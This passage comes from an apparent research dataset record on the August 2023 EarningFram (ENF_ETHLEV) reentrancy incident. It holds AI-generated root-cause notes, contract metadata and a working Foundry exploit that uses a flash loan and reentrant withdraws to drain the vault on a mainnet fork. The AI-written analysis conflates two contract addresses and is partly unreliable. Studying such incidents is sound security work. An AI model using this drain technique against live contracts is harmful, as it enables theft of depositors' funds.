 `withdraw` function calls `IController(controller).withdraw(assets, receiver)` before performing state updates and checks. The attacker leverages this by initiating a flash loan and then calling the `deposit` function. Inside the `deposit` function, after the `IController.deposit` call, the attacker can re-enter the `EFVault` contract by calling `withdraw` within the same transaction. This reentrancy allows the attacker to manipulate the `totalAssets` calculation. Specifically, by depositing and withdrawing multiple times within a single transaction, the attacker can trick the `totalAssets` function into returning a higher value than it should. This inflated `totalAssets` value is then used in the `convertToShares` calculation within the `deposit` function, leading to the minting of an excessive amount of shares for the attacker. Subsequently, the attacker can withdraw these inflated shares, effectively draining the vault of its assets. The `uniswapV3FlashCallback` function in the `ContractTest` contract is used to orchestrate this attack by providing the necessary reentrant calls.", "ai_mitigation": [], "ai_root_cause": "Reentrancy vulnerability in the `EFVault` contract's `deposit` and `withdraw` functions, specifically due to the lack of proper reentrancy guards before external calls and state updates.", "ai_vulnerability_type": "Reentrancy", "attack_title": "Tx : https://etherscan.io/tx/0x6e6e556a5685980317cb2afdb628ed4a845b3cbd1c98bdaffd0561cb2c4790fa", "contracts": [{"abi_available": true, "address": "0x863e572b215fd67c855d973f870266cf827aea5e", "artifact_dir": "data/contracts/2023_08_earningfram/contracts/01_vulnerable_863e572b_efvault", "bytecode_available": true, "chain": {"id": 1, "name": "Ethereum"}, "compiler_version": "v0.8.3+commit.8d00100c", "contract_name": "EFVault", "explorer_url": "https://etherscan.io/address/0x863e572b215fd67c855d973f870266cf827aea5e", "fetch_error": null, "is_verified": true, "proxy": {"admin_address": null, "implementation_address": null, "is_proxy": false, "proxy_type": null, "resolution_depth": 0, "resolved_at": "2026-04-10T06:41:11.569Z"}, "role": "vulnerable", "source_available": true, "source_files": ["data/contracts/2023_08_earningfram/contracts/01_vulnerable_863e572b_efvault/sources/contracts/core/Vault.sol", "data/contracts/2023_08_earningfram/contracts/01_vulnerable_863e572b_efvault/sources/contracts/interfaces/IController.sol", "data/contracts/2023_08_earningfram/contracts/01_vulnerable_863e572b_efvault/sources/contracts/interfaces/IVault.sol", "data/contracts/2023_08_earningfram/contracts/01_vulnerable_863e572b_efvault/sources/contracts/utils/TransferHelper.sol", "data/contracts/2023_08_earningfram/contracts/01_vulnerable_863e572b_efvault/sources/hardhat/console.sol", "data/contracts/2023_08_earningfram/contracts/01_vulnerable_863e572b_efvault/sources/@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol", "data/contracts/2023_08_earningfram/contracts/01_vulnerable_863e572b_efvault/sources/@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol", "data/contracts/2023_08_earningfram/contracts/01_vulnerable_863e572b_efvault/sources/@openzeppelin/contracts/utils/math/SafeMath.sol", "data/contracts/2023_08_earningfram/contracts/01_vulnerable_863e572b_efvault/sources/@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol", "data/contracts/2023_08_earningfram/contracts/01_vulnerable_863e572b_efvault/sources/@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol", "data/contracts/2023_08_earningfram/contracts/01_vulnerable_863e572b_efvault/sources/@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol", "data/contracts/2023_08_earningfram/contracts/01_vulnerable_863e572b_efvault/sources/@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol", "data/contracts/2023_08_earningfram/contracts/01_vulnerable_863e572b_efvault/sources/@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol", "data/contracts/2023_08_earningfram/contracts/01_vulnerable_863e572b_efvault/sources/@openzeppelin/contracts-upgradeable/utils/ContextUpgradeable.sol", "data/contracts/2023_08_earningfram/contracts/01_vulnerable_863e572b_efvault/sources/@openzeppelin/contracts-upgradeable/token/ERC20/extensions/IERC20MetadataUpgradeable.sol", "data/contracts/2023_08_earningfram/contracts/01_vulnerable_863e572b_efvault/sources/@openzeppelin/contracts-upgradeable/token/ERC20/extensions/draft-IERC20PermitUpgradeable.sol"], "source_hint": "AI extracted: The vulnerable contract `IENF_ETHLEV` (EarningFram) is susceptible to a reentrancy attack facilitated by a flash loan. The `uniswapV3FlashCallback` function allows the attacker to repeatedly call `ENF_ETHLEV.deposit` and `ENF_ETHLEV.withdraw` within a single transaction. This manipulation causes the `totalAssets` to be inflated relative to the actual underlying assets, allowing the attacker to withdraw more assets than they deposited.", "verification_status": "verified"}], "contracts_dir": "data/contracts/2023_08_earningfram", "id": "2023_08_earningfram", "metadata": {"ai_enabled": true, "ai_model": "gemini-2.5-flash-lite|gemini-2.5-flash-lite", "dataset_version": "1.0.0", "poc_parser_version": "1.0.0", "processed_at": "2026-04-10T06:41:16.489Z"}, "num_bytecode_contracts": 1, "num_contracts": 1, "num_source_contracts": 1, "num_verified_contracts": 1, "poc_code": "// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~286K USD$
// Attacker : https://etherscan.io/address/0xee4b3dd20902fa3539706f25005fa51d3b7bdf1b
// Attack Contract : https://etherscan.io/address/0xfe141c32e36ba7601d128f0c39dedbe0f6abb983
// Vulnerable Contract : https://etherscan.io/address/0x863e572b215fd67c855d973f870266cf827aea5e
// Attack Tx : https://etherscan.io/tx/0x6e6e556a5685980317cb2afdb628ed4a845b3cbd1c98bdaffd0561cb2c4790fa

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x863e572b215fd67c855d973f870266cf827aea5e#code

// @Analysis
// Twitter Guy : https://twitter.com/Phalcon_xyz/status/1689182459269644288

interface IENF_ETHLEV is IERC20 {
    function deposit(uint256 assets, address receiver) external payable returns (uint256);

    function withdraw(uint256 assets, address receiver) external returns (uint256);

    function convertToAssets(
        uint256 shares
    ) external view returns (uint256);

    function totalAssets() external view returns (uint256);
}

contract ContractTest is Test {
    IWFTM WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    Uni_Pair_V3 Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    IENF_ETHLEV ENF_ETHLEV = IENF_ETHLEV(0x5655c442227371267c165101048E4838a762675d);
    address Controller = 0xE8688D014194fd5d7acC3c17477fD6db62aDdeE9;
    Exploiter exploiter;
    uint256 nonce;

    function setUp() public {
        vm.createSelectFork("mainnet", 17_875_885);
        vm.label(address(WETH), "WETH");
        vm.label(address(ENF_ETHLEV), "ENF_ETHLEV");
        vm.label(address(Pair), "Piar");
        exploiter = new Exploiter();
    }

    function testExploit() external {
        while (ENF_ETHLEV.totalAssets() > 1 ether) {
            deal(address(this), 0);

            Pair.flash(address(this), 0, 10_000 ether, abi.encode(10_000 ether));

            emit log_named_decimal_uint(
                "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
            );
        }
    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        WETH.withdraw(WETH.balanceOf(address(this)));
        ENF_ETHLEV.approve(address(ENF_ETHLEV), type(uint256).max);
        uint256 assets = ENF_ETHLEV.totalAssets();
        ENF_ETHLEV.deposit{value: assets}(assets, address(this)); // deposit eth, mint shares

        uint256 assetsAmount = ENF_ETHLEV.convertToAssets(ENF_ETHLEV.balanceOf(address(this)));
        ENF_ETHLEV.withdraw(assetsAmount, address(this)); // withdraw all assets, burn small shares by reentracny, re-enter point

        exploiter.withdraw(); // withdraw all assets

        WETH.deposit{value: address(this).balance}();
        uint256 amount = abi.decode(data, (uint256));
        WETH.transfer(address(Pair), amount1 + amount);
    }

    receive() external payable {
        if (msg.sender == Controller) {
            ENF_ETHLEV.transfer(address(exploiter), ENF_ETHLEV.balanceOf(address(this)) - 1);
            nonce++;
        }
    }
}

contract Exploiter {
    IENF_ETHLEV ENF_ETHLEV = IENF_ETHLEV(0x5655c442227371267c165101048E4838a762675d);

    function withdraw() external {
        ENF_ETHLEV.approve(address(ENF_ETHLEV), type(uint256).max);
        uint256 assetsAmount = ENF_ETHLEV.convertToAssets(ENF_ETHLEV.balanceOf(address(this)));
        ENF_ETHLEV.withdraw(assetsAmount, address(this));
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
